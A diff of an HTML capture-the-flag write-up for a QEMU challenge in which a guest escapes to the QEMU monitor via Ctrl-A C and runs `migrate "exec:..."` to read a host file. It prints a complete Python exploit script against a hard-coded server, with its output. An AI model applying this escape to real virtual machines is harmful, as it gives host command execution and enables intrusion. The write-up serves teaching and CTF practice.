@@ -7,7 +7,7 @@
 <meta name="description" content="The hardened SlopGate PCI device is a decoy. The serial console still drops to the QEMU monitor, and `migrate &quot;exec:...&quot;` runs a command on the host." />
 <link rel="icon" href="../images/Logo-nobg.png" type="image/png" />
 <link rel="stylesheet" href="../css/fonts.css?v=2" />
-<link rel="stylesheet" href="../css/styles.css?v=16" />
+<link rel="stylesheet" href="../css/styles.css?v=17" />
 <script>document.documentElement.classList.add('js');</script>
 </head>
 <body>
@@ -56,7 +56,8 @@
   </div>
 </nav>
 
-<main class="wu-main container" id="top">
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="wu-main container" id="top">
   <div class="wu-crumbs"><a href="../index.html#top">nxt_ctfs</a> <span>/</span> <a href="../writeups.html">writeups</a> <span>/</span> <span>slopgate</span></div>
 
   <header class="wu-head">
@@ -157,53 +158,95 @@ timestamp counter attacks and MMIO re-entrancy.</p>
 <p>Context can be XOR-modified based on <code>(flags ^ stream_len ^ processed ^ score ^ ...)</code>, essentially a controlled, in-bounds byte XOR against a deterministic seed buffer.</p>
 <h2 id="the-red-herring-3-hours"><a class="wu-anchor" href="#the-red-herring-3-hours" aria-hidden="true">#</a>The Red Herring (3 hours)</h2>
 <p>I spent approximately 3 hours chasing a DMA exploitation path:</p>
-<ol>
-<li><p><strong>PCI bus master enabling</strong> - the device initially returned ERROR on
+
+<div class="wu-steps">
+      
+      <div class="wu-steps-nav" role="tablist" aria-label="Steps"><button type="button" class="wu-step-dot" role="tab" aria-selected="true" data-step="0">1</button><button type="button" class="wu-step-dot" role="tab" aria-selected="false" data-step="1">2</button><button type="button" class="wu-step-dot" role="tab" aria-selected="false" data-step="2">3</button><button type="button" class="wu-step-dot" role="tab" aria-selected="false" data-step="3">4</button><button type="button" class="wu-step-dot" role="tab" aria-selected="false" data-step="4">5</button><button type="button" class="wu-step-dot" role="tab" aria-selected="false" data-step="5">6</button><button type="button" class="wu-step-dot" role="tab" aria-selected="false" data-step="6">7</button></div>
+      <div class="wu-steps-body"><section class="wu-step is-current" data-step="0">
+          <h4 class="wu-step-title"><span class="wu-step-num">1/7</span>PCI bus master enabling</h4>
+          <p>The device initially returned ERROR on
 every DMA operation. Setting PCI config space COMMAND register to <code>0x0007</code>
 (IO + MEM + BUS_MASTER) via <code>/sys/devices/pci0000:00/0000:00:02.0/config</code>
 fixed this.</p>
-</li>
-<li><p><strong>Pagemap translation</strong> - DMA uses physical addresses, not virtual. Spent
+
+        </section><section class="wu-step" data-step="1">
+          <h4 class="wu-step-title"><span class="wu-step-num">2/7</span>Pagemap translation</h4>
+          <p>DMA uses physical addresses, not virtual. Spent
 significant time debugging assembly pagemap translation (PFN mask should be
 <code>0xFFFFFFFFFF</code> for 40-bit physical addresses, not <code>0x7FFFFFFFFFFF</code>).</p>
-</li>
-<li><p><strong>Page alignment bugs</strong> - mmap&#39;d pages aren&#39;t physically contiguous.
+
+        </section><section class="wu-step" data-step="2">
+          <h4 class="wu-step-title"><span class="wu-step-num">3/7</span>Page alignment bugs</h4>
+          <p>mmap&#39;d pages aren&#39;t physically contiguous.
 Response buffers crossing page boundaries got wrong physical addresses.</p>
-</li>
-<li><p><strong>Assembly register clobbers</strong> - wrote ~15 iterations of assembly exploits
+
+        </section><section class="wu-step" data-step="3">
+          <h4 class="wu-step-title"><span class="wu-step-num">4/7</span>Assembly register clobbers</h4>
+          <p>Wrote ~15 iterations of assembly exploits
 with bugs in print routines, 64-bit immediate loading, and label numbering.</p>
-</li>
-<li><p><strong>Scanning guest RAM</strong> - scanned 0-128MB of guest physical address space
+
+        </section><section class="wu-step" data-step="4">
+          <h4 class="wu-step-title"><span class="wu-step-num">5/7</span>Scanning guest RAM</h4>
+          <p>Scanned 0-128MB of guest physical address space
 looking for the flag. Scores were always 0x0b (noise floor: length_bucket=8</p>
 <ul>
 <li>salt=3). The flag was never in guest RAM - it&#39;s on the QEMU host filesystem.</li>
 </ul>
-</li>
-<li><p><strong>Attempted OOB DMA</strong> - tried reading above 128MB (into QEMU host memory).
+
+        </section><section class="wu-step" data-step="5">
+          <h4 class="wu-step-title"><span class="wu-step-num">6/7</span>Attempted OOB DMA</h4>
+          <p>Tried reading above 128MB (into QEMU host memory).
 TCG properly bounds-checks against the memory region tree; reads to unmapped
 addresses returned zeros.</p>
-</li>
-<li><p><strong>Context XOR corruption</strong> - verified the XOR works (can read context,
+
+        </section><section class="wu-step" data-step="6">
+          <h4 class="wu-step-title"><span class="wu-step-num">7/7</span>Context XOR corruption</h4>
+          <p>Verified the XOR works (can read context,
 observe XOR effects), but it&#39;s strictly in-bounds and modifies a seed-derived
 buffer - not useful for anything beyond proof-of-concept.</p>
-</li>
-</ol>
+
+        </section></div>
+      <div class="wu-steps-controls">
+        <button type="button" class="wu-step-prev">&larr; prev</button>
+        <button type="button" class="wu-step-showall">show all</button>
+        <button type="button" class="wu-step-next">next &rarr;</button>
+      </div>
+    </div>
 <h2 id="the-real-vulnerability"><a class="wu-anchor" href="#the-real-vulnerability" aria-hidden="true">#</a>The Real Vulnerability</h2>
 <p>The serial console runs without <code>-no-shutdown</code> or monitor restrictions. Simply
-sending Ctrl-A C (0x01 followed by &#39;c&#39;) drops into the <strong>QEMU Monitor (HMP)</strong>.</p>
-<pre><code>$ echo -e &#39;\x01c&#39; &gt; /dev/ttyS0
-QEMU 11.1.0 monitor - type &#39;help&#39; for more information
-(qemu) 
-</code></pre>
-<p>From the monitor, the <code>migrate</code> command supports an <code>exec:</code> URI scheme that
-spawns a subprocess and pipes migration data to/from it. Critically, <strong>the
-subprocess runs as the QEMU user on the host</strong>, and its stderr is connected to
-QEMU&#39;s stderr - which is the serial console.</p>
+sending Ctrl-A C (0x01 followed by &#39;c&#39;) drops into the <strong>QEMU Monitor (HMP)</strong>,
+and from there the <code>migrate</code> command&#39;s <code>exec:</code> URI scheme spawns a subprocess
+on the host and pipes its stderr straight to the serial console:</p>
+<div class="wu-session">
+      <div class="wu-session-bar">
+        <span class="wu-session-label">session</span>
+        <button type="button" class="wu-session-replay">replay</button>
+      </div>
+      <pre class="wu-session-body"><span class="wu-term-line" data-kind="cmd"><span class="wu-term-prompt">$</span><span class="wu-term-cmd">echo -e '\x01c' &gt; /dev/ttyS0</span></span>
+<span class="wu-term-line" data-kind="out">QEMU 11.1.0 monitor - type 'help' for more information</span>
+<span class="wu-term-line" data-kind="cmd"><span class="wu-term-prompt">$</span><span class="wu-term-cmd">migrate &quot;exec:cat /app/flag.txt &gt;&amp;2&quot;</span></span>
+<span class="wu-term-line" data-kind="out">kaspersky{I_th1nk_w3_b0th_g0t_dumb3r_wh1l3_s0lvin6_this_t4sk}</span>
+<span class="wu-term-line" data-kind="out">qemu-system-x86_64: failed to save SaveStateEntry...</span></pre>
+    </div>
+<div class="wu-admon wu-admon-insight">
+      <p class="wu-admon-h">Insight</p>
+      <p><code>migrate exec:</code> is meant for migrating a VM&#39;s state through an external
+helper process. Critically, <strong>that subprocess runs as the QEMU user on the
+host</strong>, and its stderr is connected to QEMU&#39;s own stderr - which is the
+serial console we already control from inside the guest.</p>
+
+    </div>
 <h2 id="exploit"><a class="wu-anchor" href="#exploit" aria-hidden="true">#</a>Exploit</h2>
 <p>Single command from the QEMU monitor:</p>
-<pre><code>migrate &quot;exec:cat /app/flag.txt &gt;&amp;2&quot;
-</code></pre>
-<p>This:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-text">migrate &quot;exec:cat /app/flag.txt &gt;&amp;2&quot;</code></pre>
+      
+    </figure><p>This:</p>
 <ol>
 <li>Shells out to <code>/bin/sh -c &quot;cat /app/flag.txt &gt;&amp;2&quot;</code></li>
 <li>The flag is printed to stderr</li>
@@ -212,67 +255,84 @@ QEMU&#39;s stderr - which is the serial console.</p>
 but the flag is already captured</li>
 </ol>
 <h3 id="full-exploit-script"><a class="wu-anchor" href="#full-exploit-script" aria-hidden="true">#</a>Full Exploit Script</h3>
-<pre><code class="language-python">import socket, subprocess, time, re, concurrent.futures
 
-IP = &quot;84.201.150.184&quot;
-PORT = 31338
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.settimeout(10)
-sock.connect((IP, PORT))
-
-# Read PoW challenge
-data = b&#39;&#39;
-while b&#39;token:&#39; not in data:
-    data += sock.recv(4096)
-
-# Solve PoW
-m = re.search(r&#39;hashcash -mb(\d+) (\S+)&#39;, data.decode())
-with concurrent.futures.ThreadPoolExecutor() as ex:
-    f = ex.submit(lambda: subprocess.run(
-        [&#39;hashcash&#39;, f&#39;-mb{m.group(1)}&#39;, m.group(2)],
-        capture_output=True, text=True, timeout=300).stdout.strip())
-    token = f.result(timeout=300)
-
-sock.sendall((token + &#39;\n&#39;).encode())
-
-# Wait for shell
-while True:
-    c = sock.recv(4096)
-    if not c: break
-    if b&#39;# &#39; in c: break
-
-# Enter QEMU monitor (Ctrl-A C)
-sock.sendall(b&#39;\x01c&#39;)
-time.sleep(0.3)
-
-# Exploit: migrate exec with flag output to stderr
-sock.sendall(b&#39;migrate &quot;exec:cat /app/flag.txt &gt;&amp;2&quot;\n&#39;)
-time.sleep(0.5)
-
-# Back to console
-sock.sendall(b&#39;\x01c&#39;)
-time.sleep(0.3)
-sock.sendall(b&#39;echo DONE\n&#39;)
-time.sleep(0.5)
-
-# Read output
-out = b&#39;&#39;
-try:
-    while True:
-        c = sock.recv(8192)
-        if not c: break
-        out += c
-except: pass
-
-print(out.decode(errors=&#39;replace&#39;))
-</code></pre>
+<details class="wu-spoiler">
+      <summary>Show the full exploit script</summary>
+      <div class="wu-spoiler-body"><figure class="wu-code is-collapsible" data-lines="54">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">import</span> socket, subprocess, time, re, concurrent.futures</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">IP = <span class="hljs-string">&quot;84.201.150.184&quot;</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">PORT = <span class="hljs-number">31338</span></span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">sock.settimeout(<span class="hljs-number">10</span>)</span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">sock.connect((IP, PORT))</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc"><span class="hljs-comment"># Read PoW challenge</span></span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc">data = <span class="hljs-string">b&#x27;&#x27;</span></span></span>
+<span class="wu-line" data-line="12"><span class="wu-ln">12</span><span class="wu-lc"><span class="hljs-keyword">while</span> <span class="hljs-string">b&#x27;token:&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:</span></span>
+<span class="wu-line" data-line="13"><span class="wu-ln">13</span><span class="wu-lc">    data += sock.recv(<span class="hljs-number">4096</span>)</span></span>
+<span class="wu-line" data-line="14"><span class="wu-ln">14</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="15"><span class="wu-ln">15</span><span class="wu-lc"><span class="hljs-comment"># Solve PoW</span></span></span>
+<span class="wu-line" data-line="16"><span class="wu-ln">16</span><span class="wu-lc">m = re.search(<span class="hljs-string">r&#x27;hashcash -mb(\d+) (\S+)&#x27;</span>, data.decode())</span></span>
+<span class="wu-line" data-line="17"><span class="wu-ln">17</span><span class="wu-lc"><span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="hljs-keyword">as</span> ex:</span></span>
+<span class="wu-line" data-line="18"><span class="wu-ln">18</span><span class="wu-lc">    f = ex.submit(<span class="hljs-keyword">lambda</span>: subprocess.run(</span></span>
+<span class="wu-line" data-line="19"><span class="wu-ln">19</span><span class="wu-lc">        [<span class="hljs-string">&#x27;hashcash&#x27;</span>, <span class="hljs-string">f&#x27;-mb<span class="hljs-subst">{m.group(<span class="hljs-number">1</span>)}</span>&#x27;</span>, m.group(<span class="hljs-number">2</span>)],</span></span>
+<span class="wu-line" data-line="20"><span class="wu-ln">20</span><span class="wu-lc">        capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>, timeout=<span class="hljs-number">300</span>).stdout.strip())</span></span>
+<span class="wu-line" data-line="21"><span class="wu-ln">21</span><span class="wu-lc">    token = f.result(timeout=<span class="hljs-number">300</span>)</span></span>
+<span class="wu-line" data-line="22"><span class="wu-ln">22</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="23"><span class="wu-ln">23</span><span class="wu-lc">sock.sendall((token + <span class="hljs-string">&#x27;\n&#x27;</span>).encode())</span></span>
+<span class="wu-line" data-line="24"><span class="wu-ln">24</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="25"><span class="wu-ln">25</span><span class="wu-lc"><span class="hljs-comment"># Wait for shell</span></span></span>
+<span class="wu-line" data-line="26"><span class="wu-ln">26</span><span class="wu-lc"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span></span>
+<span class="wu-line" data-line="27"><span class="wu-ln">27</span><span class="wu-lc">    c = sock.recv(<span class="hljs-number">4096</span>)</span></span>
+<span class="wu-line" data-line="28"><span class="wu-ln">28</span><span class="wu-lc">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> c: <span class="hljs-keyword">break</span></span></span>
+<span class="wu-line" data-line="29"><span class="wu-ln">29</span><span class="wu-lc">    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;# &#x27;</span> <span class="hljs-keyword">in</span> c: <span class="hljs-keyword">break</span></span></span>
+<span class="wu-line" data-line="30"><span class="wu-ln">30</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="31"><span class="wu-ln">31</span><span class="wu-lc"><span class="hljs-comment"># Enter QEMU monitor (Ctrl-A C)</span></span></span>
+<span class="wu-line" data-line="32"><span class="wu-ln">32</span><span class="wu-lc">sock.sendall(<span class="hljs-string">b&#x27;\x01c&#x27;</span>)</span></span>
+<span class="wu-line" data-line="33"><span class="wu-ln">33</span><span class="wu-lc">time.sleep(<span class="hljs-number">0.3</span>)</span></span>
+<span class="wu-line" data-line="34"><span class="wu-ln">34</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="35"><span class="wu-ln">35</span><span class="wu-lc"><span class="hljs-comment"># Exploit: migrate exec with flag output to stderr</span></span></span>
+<span class="wu-line" data-line="36"><span class="wu-ln">36</span><span class="wu-lc">sock.sendall(<span class="hljs-string">b&#x27;migrate &quot;exec:cat /app/flag.txt &gt;&amp;2&quot;\n&#x27;</span>)</span></span>
+<span class="wu-line" data-line="37"><span class="wu-ln">37</span><span class="wu-lc">time.sleep(<span class="hljs-number">0.5</span>)</span></span>
+<span class="wu-line" data-line="38"><span class="wu-ln">38</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="39"><span class="wu-ln">39</span><span class="wu-lc"><span class="hljs-comment"># Back to console</span></span></span>
+<span class="wu-line" data-line="40"><span class="wu-ln">40</span><span class="wu-lc">sock.sendall(<span class="hljs-string">b&#x27;\x01c&#x27;</span>)</span></span>
+<span class="wu-line" data-line="41"><span class="wu-ln">41</span><span class="wu-lc">time.sleep(<span class="hljs-number">0.3</span>)</span></span>
+<span class="wu-line" data-line="42"><span class="wu-ln">42</span><span class="wu-lc">sock.sendall(<span class="hljs-string">b&#x27;echo DONE\n&#x27;</span>)</span></span>
+<span class="wu-line" data-line="43"><span class="wu-ln">43</span><span class="wu-lc">time.sleep(<span class="hljs-number">0.5</span>)</span></span>
+<span class="wu-line" data-line="44"><span class="wu-ln">44</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="45"><span class="wu-ln">45</span><span class="wu-lc"><span class="hljs-comment"># Read output</span></span></span>
+<span class="wu-line" data-line="46"><span class="wu-ln">46</span><span class="wu-lc">out = <span class="hljs-string">b&#x27;&#x27;</span></span></span>
+<span class="wu-line" data-line="47"><span class="wu-ln">47</span><span class="wu-lc"><span class="hljs-keyword">try</span>:</span></span>
+<span class="wu-line" data-line="48"><span class="wu-ln">48</span><span class="wu-lc">    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span></span>
+<span class="wu-line" data-line="49"><span class="wu-ln">49</span><span class="wu-lc">        c = sock.recv(<span class="hljs-number">8192</span>)</span></span>
+<span class="wu-line" data-line="50"><span class="wu-ln">50</span><span class="wu-lc">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> c: <span class="hljs-keyword">break</span></span></span>
+<span class="wu-line" data-line="51"><span class="wu-ln">51</span><span class="wu-lc">        out += c</span></span>
+<span class="wu-line" data-line="52"><span class="wu-ln">52</span><span class="wu-lc"><span class="hljs-keyword">except</span>: <span class="hljs-keyword">pass</span></span></span>
+<span class="wu-line" data-line="53"><span class="wu-ln">53</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="54"><span class="wu-ln">54</span><span class="wu-lc"><span class="hljs-built_in">print</span>(out.decode(errors=<span class="hljs-string">&#x27;replace&#x27;</span>))</span></span></code></pre>
+      <button type="button" class="wu-code-more" aria-expanded="false" data-more="+42 lines" data-less="show less">+42 lines</button>
+    </figure></div>
+    </details>
 <p>Output:</p>
-<pre><code>migrate &quot;exec:cat /app/flag.txt &gt;&amp;2&quot;
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-text">migrate &quot;exec:cat /app/flag.txt &gt;&amp;2&quot;
 kaspersky{I_th1nk_w3_b0th_g0t_dumb3r_wh1l3_s0lvin6_this_t4sk}
-qemu-system-x86_64: failed to save SaveStateEntry...
-</code></pre>
-<h2 id="lessons-learned"><a class="wu-anchor" href="#lessons-learned" aria-hidden="true">#</a>Lessons Learned</h2>
+qemu-system-x86_64: failed to save SaveStateEntry...</code></pre>
+      
+    </figure><h2 id="lessons-learned"><a class="wu-anchor" href="#lessons-learned" aria-hidden="true">#</a>Lessons Learned</h2>
 <ol>
 <li><p><strong>Check the monitor first.</strong> QEMU challenges often disable the monitor with
 <code>-monitor none</code>, but when they don&#39;t, <code>migrate exec:</code> is an instant win.
@@ -306,8 +366,9 @@ time on the DMA dead-end.</p>
 
     </article>
     <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
         <p class="wu-toc-h">On this page</p>
-        <ol><li><a href="#overview">Overview</a></li><li><a href="#initial-recon">Initial Recon</a></li><li><a href="#the-red-herring-3-hours">The Red Herring (3 hours)</a></li><li><a href="#the-real-vulnerability">The Real Vulnerability</a></li><li><a href="#exploit">Exploit</a></li><li><a href="#lessons-learned">Lessons Learned</a></li><li><a href="#files">Files</a></li></ol>
+        <ol><li><a href="#overview">Overview</a></li><li><a href="#initial-recon">Initial Recon</a><ol class="wu-toc-sub"><li><a href="#qemu-device-layout">QEMU Device Layout</a></li><li><a href="#dma-operations">DMA Operations</a></li><li><a href="#scoring-modes">Scoring Modes</a></li></ol></li><li><a href="#the-red-herring-3-hours">The Red Herring (3 hours)</a></li><li><a href="#the-real-vulnerability">The Real Vulnerability</a></li><li><a href="#exploit">Exploit</a><ol class="wu-toc-sub"><li><a href="#full-exploit-script">Full Exploit Script</a></li></ol></li><li><a href="#lessons-learned">Lessons Learned</a></li><li><a href="#files">Files</a></li></ol>
       </nav>
   </div>
 
@@ -347,6 +408,6 @@ time on the DMA dead-end.</p>
   </div>
 </footer>
 
-<script src="../js/script.js?v=16"></script>
+<script src="../js/script.js?v=17"></script>
 </body>
 </html>
